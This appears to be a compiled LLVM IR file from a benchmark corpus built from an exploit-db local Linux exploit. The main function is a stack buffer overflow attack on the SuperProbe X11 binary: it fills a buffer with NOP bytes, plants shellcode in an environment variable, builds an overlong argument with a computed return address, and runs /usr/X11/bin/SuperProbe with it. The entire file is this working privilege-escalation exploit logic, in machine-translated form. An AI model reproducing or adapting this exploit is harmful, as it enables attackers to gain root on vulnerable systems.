; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19283.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19283.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@bufsize = common dso_local global i32 0, align 4
@buffer = common dso_local global i64* null, align 8
@shellcode = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [10 x i8] c"SHELLCODE\00", align 1
@alignment = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [24 x i8] c"/usr/X11/bin/SuperProbe\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"SuperProbe\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"-nopr\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  br label %3

3:                                                ; preds = %16, %0
  %4 = load i32, i32* %2, align 4
  %5 = load i32, i32* @bufsize, align 4
  %6 = sdiv i32 %5, 2
  %7 = icmp slt i32 %4, %6
  br i1 %7, label %8, label %19

8:                                                ; preds = %3
  %9 = call i8* (...) @get_sp()
  %10 = getelementptr inbounds i8, i8* %9, i64 -2048
  %11 = load i64*, i64** @buffer, align 8
  %12 = load i32, i32* %2, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i64, i64* %11, i64 %13
  %15 = bitcast i64* %14 to i8**
  store i8* %10, i8** %15, align 8
  br label %16

16:                                               ; preds = %8
  %17 = load i32, i32* %2, align 4
  %18 = add nsw i32 %17, 4
  store i32 %18, i32* %2, align 4
  br label %3

19:                                               ; preds = %3
  %20 = load i64*, i64** @buffer, align 8
  %21 = load i32, i32* @bufsize, align 4
  %22 = sdiv i32 %21, 2
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds i64, i64* %20, i64 %23
  %25 = load i32, i32* @bufsize, align 4
  %26 = sdiv i32 %25, 2
  %27 = call i32 @memset(i64* %24, i8 signext -112, i32 %26)
  %28 = load i64*, i64** @buffer, align 8
  %29 = load i32, i32* @bufsize, align 4
  %30 = sub nsw i32 %29, 256
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i64, i64* %28, i64 %31
  %33 = load i32, i32* @shellcode, align 4
  %34 = call i32 @strcpy(i64* %32, i32 %33)
  %35 = load i64*, i64** @buffer, align 8
  %36 = call i32 @setenv(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i64* %35, i32 1)
  %37 = load i64*, i64** @buffer, align 8
  %38 = call i32 @memset(i64* %37, i8 signext 120, i32 72)
  %39 = call i8* (...) @get_sp()
  %40 = getelementptr inbounds i8, i8* %39, i64 -6144
  %41 = load i8*, i8** @alignment, align 8
  %42 = ptrtoint i8* %40 to i64
  %43 = ptrtoint i8* %41 to i64
  %44 = sub i64 %42, %43
  %45 = inttoptr i64 %44 to i8*
  %46 = load i64*, i64** @buffer, align 8
  %47 = getelementptr inbounds i64, i64* %46, i64 72
  %48 = bitcast i64* %47 to i8**
  store i8* %45, i8** %48, align 8
  %49 = load i64*, i64** @buffer, align 8
  %50 = getelementptr inbounds i64, i64* %49, i64 76
  store i64 0, i64* %50, align 8
  %51 = load i64*, i64** @buffer, align 8
  %52 = call i32 @execl(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i64* %51, i32* null)
  %53 = load i32, i32* %1, align 4
  ret i32 %53
}

declare dso_local i8* @get_sp(...) #1

declare dso_local i32 @memset(i64*, i8 signext, i32) #1

declare dso_local i32 @strcpy(i64*, i32) #1

declare dso_local i32 @setenv(i8*, i64*, i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i64*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
